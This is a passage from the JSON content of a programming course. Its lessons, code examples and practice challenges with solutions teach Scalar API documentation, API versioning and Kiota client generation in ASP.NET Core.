              "content": "## Breaking Down the Syntax\n\n**`app.MapScalarApiReference()`**: Adds Scalar UI to your app. By default available at `/scalar/v1`. Reads your OpenAPI spec and generates beautiful documentation.\n\n**`.WithTitle(\"My API\")`**: Sets the title displayed in the Scalar header. Use your API's name or product name.\n\n**`.WithTheme(ScalarTheme.Purple)`**: Choose from built-in themes. Options: Default, Purple, Solarized, BluePlanet, Saturn, Kepler, Mars, DeepSpace.\n\n**`.WithDarkMode(true)`**: Enable dark mode by default. Users can still toggle. Modern developers often prefer dark mode.\n\n**`.WithDefaultHttpClient(target, client)`**: Set the default code example language. ScalarTarget.CSharp shows C# examples first.\n\n**`.WithPreferredScheme(\"Bearer\")`**: Hint for authentication. Tells Scalar your API uses JWT Bearer tokens.\n\n**`.WithSummary(\"...\")`**: Short one-line summary shown in endpoint lists. Keep it brief - 3-5 words ideal.\n\n**`.WithDescription(\"...\")`**: Longer explanation shown when endpoint is expanded. Can include details about behavior, requirements.\n\n**Scalar vs Swagger**: Scalar is a modern alternative with better UX. Both use OpenAPI spec, so you can switch anytime."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "**Order Matters**: Always call `app.MapOpenApi()` BEFORE `app.MapScalarApiReference()`. Scalar reads from the OpenAPI endpoint - if it doesn't exist yet, you'll get an empty documentation page with no helpful error message.\n\n**Separate NuGet Package**: Unlike the built-in OpenAPI support, Scalar requires installing `Scalar.AspNetCore` from NuGet. Don't forget: `dotnet add package Scalar.AspNetCore`.\n\n**Development Only**: Consider wrapping Scalar in an environment check: `if (app.Environment.IsDevelopment()) { app.MapScalarApiReference(); }`. You typically don't want to expose API documentation in production.\n\n**URL Path Confusion**: Scalar UI is at `/scalar/v1` by default, while the raw OpenAPI spec is at `/openapi/v1.json`. Don't confuse these - browsers should visit `/scalar/v1` for the interactive UI.\n\n**Theme Persistence**: The theme and dark mode settings are defaults. Users can change them in the UI, but those preferences may not persist across sessions depending on browser settings.\n\n**Missing using Statement**: If `WithTitle`, `WithTheme`, etc. don't compile, you're missing `using Scalar.AspNetCore;` at the top of your file."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-19-02-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Set up Scalar documentation for a Movie API!\n\n1. Add OpenAPI and Scalar services\n2. Configure Scalar with:\n   - Title: 'Movie Database API'\n   - Theme: DeepSpace (dark theme)\n   - Dark mode enabled\n   - Default client: Python\n\n3. Create these documented endpoints:\n   - GET /movies - List all movies\n   - GET /movies/{id} - Get movie by ID\n   - GET /movies/search?genre=&year= - Search movies\n   - POST /movies - Add new movie\n\n4. Each endpoint needs WithName, WithSummary, WithDescription, WithTags\n\n5. Create Movie record: Id, Title, Genre, Year, Rating\n\n6. Print the Scalar UI URL when app starts",
              "starterCode": "// TODO: Add using statement for Scalar\n\nvar builder = WebApplication.CreateBuilder(args);\n\n// TODO: Add OpenAPI services\n\nvar app = builder.Build();\n\n// TODO: Map OpenAPI endpoint\n\n// TODO: Add Scalar UI with configuration:\n// - Title: \"Movie Database API\"\n// - Theme: DeepSpace\n// - Dark mode: true\n// - Default client: Python\n\nvar movies = new List<Movie>\n{\n    new(1, \"The Matrix\", \"Sci-Fi\", 1999, 8.7),\n    new(2, \"Inception\", \"Sci-Fi\", 2010, 8.8),\n    new(3, \"The Dark Knight\", \"Action\", 2008, 9.0)\n};\n\n// TODO: GET /movies endpoint\n// - WithName(\"GetMovies\")\n// - WithSummary(\"List all movies\")\n// - WithDescription(\"Returns the complete movie catalog\")\n// - WithTags(\"Movies\")\n\n// TODO: GET /movies/{id} endpoint\n\n// TODO: GET /movies/search endpoint with genre and year query params\n\n// TODO: POST /movies endpoint\n\n// TODO: Print Scalar UI URL\n\napp.Run();\n\n// TODO: Define Movie record\n// TODO: Define CreateMovieRequest record",
              "solution": "using Scalar.AspNetCore;\n\nvar builder = WebApplication.CreateBuilder(args);\n\n// Add OpenAPI services\nbuilder.Services.AddOpenApi();\n\nvar app = builder.Build();\n\n// Map OpenAPI endpoint\napp.MapOpenApi();\n\n// Add Scalar UI with custom configuration\napp.MapScalarApiReference(options =>\n{\n    options\n        .WithTitle(\"Movie Database API\")\n        .WithTheme(ScalarTheme.DeepSpace)\n        .WithDarkMode(true)\n        .WithDefaultHttpClient(ScalarTarget.Python, ScalarClient.Requests);\n});\n\nvar movies = new List<Movie>\n{\n    new(1, \"The Matrix\", \"Sci-Fi\", 1999, 8.7),\n    new(2, \"Inception\", \"Sci-Fi\", 2010, 8.8),\n    new(3, \"The Dark Knight\", \"Action\", 2008, 9.0)\n};\n\n// GET /movies - List all movies\napp.MapGet(\"/movies\", () => movies)\n    .WithName(\"GetMovies\")\n    .WithSummary(\"List all movies\")\n    .WithDescription(\"Returns the complete movie catalog with all available films\")\n    .WithTags(\"Movies\")\n    .Produces<List<Movie>>(StatusCodes.Status200OK);\n\n// GET /movies/{id} - Get movie by ID\napp.MapGet(\"/movies/{id}\", (int id) =>\n{\n    var movie = movies.FirstOrDefault(m => m.Id == id);\n    return movie is not null\n        ? Results.Ok(movie)\n        : Results.NotFound($\"Movie with ID {id} not found\");\n})\n    .WithName(\"GetMovieById\")\n    .WithSummary(\"Get movie by ID\")\n    .WithDescription(\"Returns a specific movie by its unique identifier\")\n    .WithTags(\"Movies\")\n    .Produces<Movie>(StatusCodes.Status200OK)\n    .Produces(StatusCodes.Status404NotFound);\n\n// GET /movies/search - Search movies\napp.MapGet(\"/movies/search\", (string? genre, int? year) =>\n{\n    var results = movies.AsEnumerable();\n    \n    if (!string.IsNullOrEmpty(genre))\n        results = results.Where(m => m.Genre.Equals(genre, StringComparison.OrdinalIgnoreCase));\n    if (year.HasValue)\n        results = results.Where(m => m.Year == year);\n    \n    return results.ToList();\n})\n    .WithName(\"SearchMovies\")\n    .WithSummary(\"Search movies\")\n    .WithDescription(\"Search movies by genre and/or release year\")\n    .WithTags(\"Movies\")\n    .Produces<List<Movie>>(StatusCodes.Status200OK);\n\n// POST /movies - Add new movie\napp.MapPost(\"/movies\", (CreateMovieRequest request) =>\n{\n    var movie = new Movie(\n        movies.Max(m => m.Id) + 1,\n        request.Title,\n        request.Genre,\n        request.Year,\n        request.Rating\n    );\n    movies.Add(movie);\n    return Results.Created($\"/movies/{movie.Id}\", movie);\n})\n    .WithName(\"CreateMovie\")\n    .WithSummary(\"Add new movie\")\n    .WithDescription(\"Adds a new movie to the database\")\n    .WithTags(\"Movies\")\n    .Accepts<CreateMovieRequest>(\"application/json\")\n    .Produces<Movie>(StatusCodes.Status201Created);\n\n// Print Scalar UI URL\nConsole.WriteLine(\"Scalar API Documentation: http://localhost:5000/scalar/v1\");\n\napp.Run();\n\npublic record Movie(int Id, string Title, string Genre, int Year, double Rating);\n\npublic record CreateMovieRequest(string Title, string Genre, int Year, double Rating);",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Should configure Scalar with title",
                  "expectedOutput": "Movie Database API",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Should use DeepSpace theme",
                  "expectedOutput": "DeepSpace",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Add 'using Scalar.AspNetCore;' at the top for Scalar extensions."
                },
                {
                  "level": 2,
                  "text": "Chain Scalar options: options.WithTitle(...).WithTheme(...).WithDarkMode(...)"
                },
                {
                  "level": 3,
                  "text": "For Python default: .WithDefaultHttpClient(ScalarTarget.Python, ScalarClient.Requests)"
                },
                {
                  "level": 4,
                  "text": "WithSummary is short (shown in list), WithDescription is longer (shown when expanded)."
                },
                {
                  "level": 5,
                  "text": "Scalar UI is at /scalar/v1 by default. Print this URL for easy access."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting to call MapOpenApi before MapScalarApiReference",
                  "consequence": "Scalar needs the OpenAPI spec! Without MapOpenApi(), Scalar has no documentation to display.",
                  "correction": "Always call app.MapOpenApi() before app.MapScalarApiReference()."
                },
                {
                  "mistake": "Missing the using statement for Scalar.AspNetCore",
                  "consequence": "Extension methods like WithTitle, WithTheme won't be available.",
                  "correction": "Add 'using Scalar.AspNetCore;' at the top of your file."
                },
                {
                  "mistake": "Confusing WithSummary and WithDescription",
                  "consequence": "Summary appears in endpoint list, Description appears in expanded view. Wrong placement = poor UX.",
                  "correction": "Summary: 3-5 words (like a headline). Description: Full explanation of endpoint behavior."
                },
                {
                  "mistake": "Not installing the Scalar.AspNetCore NuGet package",
                  "consequence": "MapScalarApiReference method won't exist. Compile error.",
                  "correction": "Run: dotnet add package Scalar.AspNetCore"
                }
              ],
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "lesson-19-03",
          "title": "API Versioning Strategies",
          "moduleId": "module-19",
          "order": 3,
          "estimatedMinutes": 25,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine you're running a restaurant that needs to update its menu:\n\nNO VERSIONING (Breaking Changes):\n- Change the pasta recipe completely\n- Regular customers order 'pasta' expecting the old dish\n- They get something totally different!\n- Angry customers, bad reviews\n\nURL VERSIONING (/v1/, /v2/):\n- Two separate menus: 'Classic Menu' and 'New Menu'\n- Customers explicitly choose which one\n- 'I'll order from the Classic Menu'\n- Clear separation, no surprises\n\nHEADER VERSIONING (X-API-Version):\n- Same menu card, but waiter asks 'Which style?'\n- Customer says 'Traditional style' or 'Modern style'\n- Menu looks the same, behavior differs\n- Cleaner URLs, but hidden complexity\n\nQUERY VERSIONING (?api-version=1.0):\n- Add a note to your order: 'Pasta (original recipe)'\n- Works with bookmarks and sharing\n- Version visible in URL\n- Easy to test different versions\n\nWHY VERSION?\n- Clients break when APIs change\n- Mobile apps can't update instantly\n- Partners need migration time\n- Multiple versions can coexist\n\nVERSION STRATEGIES:\n1. URL Path: /api/v1/users (most common, very clear)\n2. Query String: /api/users?version=1.0 (easy to add)\n3. Header: X-API-Version: 1 (clean URLs)\n4. Media Type: Accept: application/vnd.api.v1+json (RESTful)\n\nThink: 'API versioning is like having multiple menus - old customers keep their favorites, new customers get improvements!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// ===== API VERSIONING IN .NET 9 =====\n// Install: dotnet add package Asp.Versioning.Http\n\nusing Asp.Versioning;\nusing Asp.Versioning.Builder;\n\nvar builder = WebApplication.CreateBuilder(args);\n\n// Add API versioning services\nbuilder.Services.AddApiVersioning(options =>\n{\n    options.DefaultApiVersion = new ApiVersion(1, 0);\n    options.AssumeDefaultVersionWhenUnspecified = true;\n    options.ReportApiVersions = true;  // Adds api-supported-versions header\n    \n    // Support multiple versioning schemes\n    options.ApiVersionReader = ApiVersionReader.Combine(\n        new UrlSegmentApiVersionReader(),           // /api/v1/\n        new QueryStringApiVersionReader(\"version\"), // ?version=1.0\n        new HeaderApiVersionReader(\"X-API-Version\") // X-API-Version: 1.0\n    );\n}).AddApiExplorer(options =>\n{\n    options.GroupNameFormat = \"'v'VVV\";  // v1, v2, etc.\n    options.SubstituteApiVersionInUrl = true;\n});\n\nbuilder.Services.AddOpenApi();\n\nvar app = builder.Build();\n\napp.MapOpenApi();\n\n// ===== VERSION 1 ENDPOINTS =====\nvar v1 = app.NewVersionedApi()\n    .MapGroup(\"/api/v{version:apiVersion}/products\")\n    .HasApiVersion(new ApiVersion(1, 0));\n\nv1.MapGet(\"/\", () =>\n{\n    // V1: Simple product list\n    return new[]\n    {\n        new ProductV1(1, \"Laptop\", 999.99m),\n        new ProductV1(2, \"Mouse\", 29.99m)\n    };\n})\n    .WithName(\"GetProductsV1\")\n    .WithTags(\"Products\");\n\nv1.MapGet(\"/{id}\", (int id) =>\n{\n    return new ProductV1(id, \"Sample Product\", 49.99m);\n})\n    .WithName(\"GetProductByIdV1\")\n    .WithTags(\"Products\");\n\n// ===== VERSION 2 ENDPOINTS (Enhanced) =====\nvar v2 = app.NewVersionedApi()\n    .MapGroup(\"/api/v{version:apiVersion}/products\")\n    .HasApiVersion(new ApiVersion(2, 0));\n\nv2.MapGet(\"/\", () =>\n{\n    // V2: Enhanced product with more fields\n    return new[]\n    {\n        new ProductV2(1, \"Laptop\", 999.99m, \"Electronics\", 50, 4.5),\n        new ProductV2(2, \"Mouse\", 29.99m, \"Accessories\", 200, 4.8)\n    };\n})\n    .WithName(\"GetProductsV2\")\n    .WithTags(\"Products\");\n\nv2.MapGet(\"/{id}\", (int id) =>\n{\n    return new ProductV2(id, \"Sample Product\", 49.99m, \"General\", 100, 4.0);\n})\n    .WithName(\"GetProductByIdV2\")\n    .WithTags(\"Products\");\n\n// Search only available in V2\nv2.MapGet(\"/search\", (string? category, decimal? minPrice) =>\n{\n    return new[] { new ProductV2(1, \"Found Item\", minPrice ?? 0, category ?? \"All\", 10, 4.0) };\n})\n    .WithName(\"SearchProductsV2\")\n    .WithTags(\"Products\");\n\nConsole.WriteLine(\"API Versions:\");\nConsole.WriteLine(\"  V1: /api/v1/products (basic)\");\nConsole.WriteLine(\"  V2: /api/v2/products (enhanced + search)\");\nConsole.WriteLine();\nConsole.WriteLine(\"Version can be specified via:\");\nConsole.WriteLine(\"  URL: /api/v1/products\");\nConsole.WriteLine(\"  Query: /api/products?version=1.0\");\nConsole.WriteLine(\"  Header: X-API-Version: 1.0\");\n\napp.Run();\n\n// ===== VERSION-SPECIFIC MODELS =====\n\n// V1: Basic product\npublic record ProductV1(int Id, string Name, decimal Price);\n\n// V2: Enhanced with category, stock, rating\npublic record ProductV2(\n    int Id, \n    string Name, \n    decimal Price, \n    string Category, \n    int StockCount, \n    double Rating\n);",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`builder.Services.AddApiVersioning()`**: Registers versioning services. Configure default version, readers, and behavior here.\n\n**`new ApiVersion(1, 0)`**: Represents version 1.0. Use major.minor format. Major = breaking changes, Minor = additions.\n\n**`AssumeDefaultVersionWhenUnspecified`**: If client doesn't specify version, use default. Good for backward compatibility.\n\n**`ReportApiVersions = true`**: Adds `api-supported-versions` header to responses. Clients can discover available versions.\n\n**`ApiVersionReader.Combine(...)`**: Accept version from multiple sources. URL segment is clearest, header is cleanest.\n\n**`app.NewVersionedApi()`**: Creates a version set for grouping endpoints. Use with MapGroup for organized versioning.\n\n**`.HasApiVersion(new ApiVersion(1, 0))`**: Marks the group as version 1.0. Only clients requesting v1.0 reach these endpoints.\n\n**`{version:apiVersion}`**: Route constraint that captures version from URL. Works with SubstituteApiVersionInUrl.\n\n**Version-specific models**: Common pattern is ProductV1, ProductV2. Each version can have different properties without breaking clients."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "**Separate Package Required**: API versioning is NOT built into .NET 9. You must install `Asp.Versioning.Http` package: `dotnet add package Asp.Versioning.Http`.\n\n**AddApiExplorer() for OpenAPI**: If your versioned endpoints don't appear correctly in Scalar/Swagger, you forgot to chain `.AddApiExplorer()` after `AddApiVersioning()`. This is required for proper OpenAPI integration.\n\n**Route Conflicts**: Having the same route path in multiple version groups without proper version constraints causes ambiguous route matching. Always use `HasApiVersion()` on groups or `MapToApiVersion()` on individual endpoints.\n\n**Breaking Changes Need New Versions**: Removing fields, changing types, or modifying behavior are breaking changes. ALWAYS create a new major version (v2.0) instead of modifying v1.0. Existing clients depend on the old contract.\n\n**Deprecation Strategy**: Don't just delete old versions. Mark them deprecated, give clients migration time (3-6 months typical), communicate the timeline, then sunset. Use `[ApiVersion(\"1.0\", Deprecated = true)]` to signal deprecation.\n\n**Version in URL vs Header**: URL versioning (`/api/v1/`) is most explicit and cacheable. Header versioning (`X-API-Version`) keeps URLs clean but can be harder to debug. Pick one primary strategy for consistency."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-19-03-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a versioned User API with two versions!\n\n1. Configure API versioning with:\n   - Default version: 1.0\n   - Support URL segment, query string, and header\n   - Report versions in response headers\n\n2. Version 1 endpoints (UserV1: Id, Name, Email):\n   - GET /api/v1/users - List users\n   - GET /api/v1/users/{id} - Get user by ID\n\n3. Version 2 endpoints (UserV2: Id, Name, Email, Role, CreatedAt):\n   - GET /api/v2/users - List users (enhanced)\n   - GET /api/v2/users/{id} - Get user by ID\n   - GET /api/v2/users/admins - NEW: Get only admin users\n\n4. Print available API versions and how to access them",
              "starterCode": "// TODO: Add using statement for Asp.Versioning\n\nvar builder = WebApplication.CreateBuilder(args);\n\n// TODO: Configure API versioning\n// - DefaultApiVersion: 1.0\n// - AssumeDefaultVersionWhenUnspecified: true\n// - ReportApiVersions: true\n// - ApiVersionReader: Combine URL, Query, Header readers\n\nbuilder.Services.AddOpenApi();\n\nvar app = builder.Build();\n\napp.MapOpenApi();\n\n// Sample data\nvar usersV1 = new[]\n{\n    new UserV1(1, \"Alice\", \"alice@example.com\"),\n    new UserV1(2, \"Bob\", \"bob@example.com\")\n};\n\nvar usersV2 = new[]\n{\n    new UserV2(1, \"Alice\", \"alice@example.com\", \"Admin\", DateTime.Parse(\"2024-01-15\")),\n    new UserV2(2, \"Bob\", \"bob@example.com\", \"User\", DateTime.Parse(\"2024-03-20\"))\n};\n\n// TODO: Create V1 endpoint group at /api/v{version:apiVersion}/users\n// - GET / - return usersV1\n// - GET /{id} - return user by ID\n\n// TODO: Create V2 endpoint group\n// - GET / - return usersV2\n// - GET /{id} - return user by ID (V2)\n// - GET /admins - return only admin users (new in V2!)\n\n// TODO: Print API version info\nConsole.WriteLine(\"Available API Versions:\");\n// Print how to access each version\n\napp.Run();\n\n// TODO: Define UserV1 record (Id, Name, Email)\n// TODO: Define UserV2 record (Id, Name, Email, Role, CreatedAt)",
              "solution": "using Asp.Versioning;\nusing Asp.Versioning.Builder;\n\nvar builder = WebApplication.CreateBuilder(args);\n\n// Configure API versioning\nbuilder.Services.AddApiVersioning(options =>\n{\n    options.DefaultApiVersion = new ApiVersion(1, 0);\n    options.AssumeDefaultVersionWhenUnspecified = true;\n    options.ReportApiVersions = true;\n    \n    options.ApiVersionReader = ApiVersionReader.Combine(\n        new UrlSegmentApiVersionReader(),\n        new QueryStringApiVersionReader(\"version\"),\n        new HeaderApiVersionReader(\"X-API-Version\")\n    );\n}).AddApiExplorer(options =>\n{\n    options.GroupNameFormat = \"'v'VVV\";\n    options.SubstituteApiVersionInUrl = true;\n});\n\nbuilder.Services.AddOpenApi();\n\nvar app = builder.Build();\n\napp.MapOpenApi();\n\n// Sample data\nvar usersV1 = new[]\n{\n    new UserV1(1, \"Alice\", \"alice@example.com\"),\n    new UserV1(2, \"Bob\", \"bob@example.com\")\n};\n\nvar usersV2 = new[]\n{\n    new UserV2(1, \"Alice\", \"alice@example.com\", \"Admin\", DateTime.Parse(\"2024-01-15\")),\n    new UserV2(2, \"Bob\", \"bob@example.com\", \"User\", DateTime.Parse(\"2024-03-20\")),\n    new UserV2(3, \"Charlie\", \"charlie@example.com\", \"Admin\", DateTime.Parse(\"2024-02-10\"))\n};\n\n// V1 endpoint group\nvar v1 = app.NewVersionedApi()\n    .MapGroup(\"/api/v{version:apiVersion}/users\")\n    .HasApiVersion(new ApiVersion(1, 0));\n\nv1.MapGet(\"/\", () => usersV1)\n    .WithName(\"GetUsersV1\")\n    .WithTags(\"Users\");\n\nv1.MapGet(\"/{id}\", (int id) =>\n{\n    var user = usersV1.FirstOrDefault(u => u.Id == id);\n    return user is not null ? Results.Ok(user) : Results.NotFound();\n})\n    .WithName(\"GetUserByIdV1\")\n    .WithTags(\"Users\");\n\n// V2 endpoint group (enhanced)\nvar v2 = app.NewVersionedApi()\n    .MapGroup(\"/api/v{version:apiVersion}/users\")\n    .HasApiVersion(new ApiVersion(2, 0));\n\nv2.MapGet(\"/\", () => usersV2)\n    .WithName(\"GetUsersV2\")\n    .WithTags(\"Users\");\n\nv2.MapGet(\"/{id}\", (int id) =>\n{\n    var user = usersV2.FirstOrDefault(u => u.Id == id);\n    return user is not null ? Results.Ok(user) : Results.NotFound();\n})\n    .WithName(\"GetUserByIdV2\")\n    .WithTags(\"Users\");\n\n// NEW in V2: Get admins only\nv2.MapGet(\"/admins\", () =>\n{\n    return usersV2.Where(u => u.Role == \"Admin\").ToArray();\n})\n    .WithName(\"GetAdminUsersV2\")\n    .WithDescription(\"Returns only users with Admin role (V2 only)\")\n    .WithTags(\"Users\");\n\n// Print API version info\nConsole.WriteLine(\"=== Available API Versions ===\");\nConsole.WriteLine();\nConsole.WriteLine(\"Version 1.0 (Basic):\");\nConsole.WriteLine(\"  GET /api/v1/users\");\nConsole.WriteLine(\"  GET /api/v1/users/{id}\");\nConsole.WriteLine();\nConsole.WriteLine(\"Version 2.0 (Enhanced):\");\nConsole.WriteLine(\"  GET /api/v2/users (includes Role, CreatedAt)\");\nConsole.WriteLine(\"  GET /api/v2/users/{id}\");\nConsole.WriteLine(\"  GET /api/v2/users/admins (NEW!)\");\nConsole.WriteLine();\nConsole.WriteLine(\"Access via:\");\nConsole.WriteLine(\"  URL: /api/v1/users or /api/v2/users\");\nConsole.WriteLine(\"  Query: /api/users?version=1.0\");\nConsole.WriteLine(\"  Header: X-API-Version: 1.0\");\n\napp.Run();\n\npublic record UserV1(int Id, string Name, string Email);\n\npublic record UserV2(int Id, string Name, string Email, string Role, DateTime CreatedAt);",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Should configure API versioning",
                  "expectedOutput": "AddApiVersioning",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Should create versioned endpoint groups",
                  "expectedOutput": "NewVersionedApi",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Add 'using Asp.Versioning;' and 'using Asp.Versioning.Builder;' for versioning extensions."
                },
                {
                  "level": 2,
                  "text": "ApiVersionReader.Combine() accepts multiple readers to support different versioning schemes."
                },
                {
                  "level": 3,
                  "text": "app.NewVersionedApi().MapGroup(...).HasApiVersion(...) creates a versioned endpoint group."
                },
                {
                  "level": 4,
                  "text": "Use {version:apiVersion} in the route template to capture version from URL."
                },
                {
                  "level": 5,
                  "text": "V2-only endpoints can simply be added to the v2 group - they won't exist in V1."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting to install Asp.Versioning.Http package",
                  "consequence": "AddApiVersioning and related types won't be available.",
                  "correction": "Run: dotnet add package Asp.Versioning.Http"
                },
                {
                  "mistake": "Using same route without version differentiation",
                  "consequence": "Ambiguous route matching. Requests fail with 500 error.",
                  "correction": "Use HasApiVersion() on groups or MapToApiVersion() on individual endpoints."
                },
                {
                  "mistake": "Not adding .AddApiExplorer() for OpenAPI support",
                  "consequence": "Versioned endpoints won't appear correctly in Swagger/Scalar documentation.",
                  "correction": "Chain .AddApiExplorer() after AddApiVersioning() for proper OpenAPI integration."
                },
                {
                  "mistake": "Breaking changes without version bump",
                  "consequence": "Existing clients break. Mobile apps crash. Partners angry.",
                  "correction": "Always create new version for breaking changes. Keep old version for migration period."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "lesson-19-04",
          "title": "Generating Typed Clients with Kiota",
          "moduleId": "module-19",
          "order": 4,
          "estimatedMinutes": 25,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine you're learning to order at a restaurant in a foreign country:\n\nMANUAL APPROACH (HttpClient):\n- You have a phrasebook (documentation)\n- Construct sentences manually\n- 'I... want... the... pasta... please'\n- Easy to make mistakes\n- No help if you mispronounce\n\nTYPED CLIENT APPROACH (Kiota):\n- You have a translation app!\n- Tap 'Order Pasta' button\n- App speaks perfect phrases for you\n- Can't make grammar mistakes\n- App knows all valid menu items\n\nCLIENT GENERATION EXPLAINED:\n\nWITHOUT GENERATED CLIENT:\n```\nvar response = await http.GetAsync(\"/api/products\");\nvar json = await response.Content.ReadAsStringAsync();\nvar products = JsonSerializer.Deserialize<List<Product>>(json);\n```\n- Manual URL construction\n- Manual deserialization\n- No IntelliSense\n- Typos cause runtime errors\n\nWITH KIOTA CLIENT:\n```\nvar products = await client.Products.GetAsync();\n```\n- Strongly typed methods\n- IntelliSense shows available endpoints\n- Compile-time error checking\n- Request/response types included\n\nKIOTA BENEFITS:\n- Microsoft's official OpenAPI client generator\n- Supports C#, Python, TypeScript, Go, Java\n- Lightweight, no heavy dependencies\n- Incremental regeneration\n- Works with any OpenAPI spec\n\nThink: 'Kiota turns your API documentation into a perfectly typed SDK - like autocomplete for API calls!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// ===== GENERATING TYPED CLIENTS WITH KIOTA =====\n\n// Step 1: Install Kiota CLI\n// dotnet tool install --global Microsoft.OpenApi.Kiota\n\n// Step 2: Generate client from OpenAPI spec\n// kiota generate -l CSharp -o ./Client -d https://api.example.com/openapi.json -c ApiClient -n MyApp.Client\n\n// Step 3: Install required packages in your project\n// dotnet add package Microsoft.Kiota.Abstractions\n// dotnet add package Microsoft.Kiota.Http.HttpClientLibrary\n// dotnet add package Microsoft.Kiota.Serialization.Json\n\n// ===== USING THE GENERATED CLIENT =====\n\nusing Microsoft.Kiota.Abstractions.Authentication;\nusing Microsoft.Kiota.Http.HttpClientLibrary;\n\n// Create authentication provider (anonymous for public APIs)\nvar authProvider = new AnonymousAuthenticationProvider();\n\n// Create HTTP client adapter\nvar adapter = new HttpClientRequestAdapter(authProvider)\n{\n    BaseUrl = \"https://api.example.com\"\n};\n\n// Create the typed API client\nvar client = new ApiClient(adapter);\n\n// ===== STRONGLY TYPED API CALLS =====\n\n// GET all products - fully typed!\nvar products = await client.Products.GetAsync();\nforeach (var product in products ?? Enumerable.Empty<Product>())\n{\n    Console.WriteLine($\"{product.Id}: {product.Name} - ${product.Price}\");\n}\n\n// GET single product by ID\nvar laptop = await client.Products[1].GetAsync();\nConsole.WriteLine($\"Found: {laptop?.Name}\");\n\n// POST create new product\nvar newProduct = await client.Products.PostAsync(new CreateProductRequest\n{\n    Name = \"New Gadget\",\n    Price = 199.99m,\n    Category = \"Electronics\"\n});\nConsole.WriteLine($\"Created: {newProduct?.Id}\");\n\n// PUT update product\nawait client.Products[1].PutAsync(new UpdateProductRequest\n{\n    Name = \"Updated Laptop\",\n    Price = 1099.99m\n});\n\n// DELETE product\nawait client.Products[99].DeleteAsync();\n\n// ===== QUERY PARAMETERS (Typed!) =====\n\n// Search with typed query parameters\nvar searchResults = await client.Products.GetAsync(config =>\n{\n    config.QueryParameters.Category = \"Electronics\";\n    config.QueryParameters.MinPrice = 100;\n    config.QueryParameters.MaxPrice = 500;\n});\n\n// ===== ERROR HANDLING =====\n\ntry\n{\n    var product = await client.Products[99999].GetAsync();\n}\ncatch (ApiException ex) when (ex.ResponseStatusCode == 404)\n{\n    Console.WriteLine(\"Product not found!\");\n}\n\n// ===== KIOTA CLI COMMANDS =====\n\n/*\n// Generate client from local file\nkiota generate -l CSharp -o ./Client -d ./openapi.json -c ApiClient -n MyApp.Client\n\n// Generate from URL\nkiota generate -l CSharp -o ./Client -d https://api.example.com/openapi/v1.json -c ApiClient -n MyApp.Client\n\n// Update existing client (incremental)\nkiota update -o ./Client\n\n// Generate for specific API paths only\nkiota generate -l CSharp -o ./Client -d ./openapi.json -c ApiClient --include-path \"/products/**\"\n\n// Languages: CSharp, TypeScript, Python, Go, Java, Ruby, PHP, Swift\n*/\n\nConsole.WriteLine(\"Kiota generates:\");\nConsole.WriteLine(\"- Strongly typed request/response models\");\nConsole.WriteLine(\"- Fluent API client with IntelliSense\");\nConsole.WriteLine(\"- Query parameter objects\");\nConsole.WriteLine(\"- Proper error types\");",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`kiota generate`**: CLI command to generate a client. Creates models and client classes from OpenAPI spec.\n\n**`-l CSharp`**: Target language. Options: CSharp, TypeScript, Python, Go, Java, Ruby, PHP, Swift.\n\n**`-o ./Client`**: Output directory. Generated files go here. Usually add to .gitignore or commit for easier builds.\n\n**`-d <spec>`**: OpenAPI document. Can be local file path or URL to live spec.\n\n**`-c ApiClient`**: Client class name. The main class you'll instantiate to make API calls.\n\n**`-n MyApp.Client`**: Namespace for generated code. Choose something that fits your project structure.\n\n**`HttpClientRequestAdapter`**: Kiota's HTTP implementation using HttpClient. Handles serialization, headers, etc.\n\n**`AnonymousAuthenticationProvider`**: For APIs without auth. Use other providers for OAuth, API keys, etc.\n\n**`client.Products.GetAsync()`**: Fluent API matches your endpoints. Products endpoint becomes Products property.\n\n**`client.Products[id].GetAsync()`**: Path parameters use indexer syntax. Clean and intuitive.\n\n**`config.QueryParameters`**: Typed query parameters. IntelliSense shows what's available. Compile-time checking."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
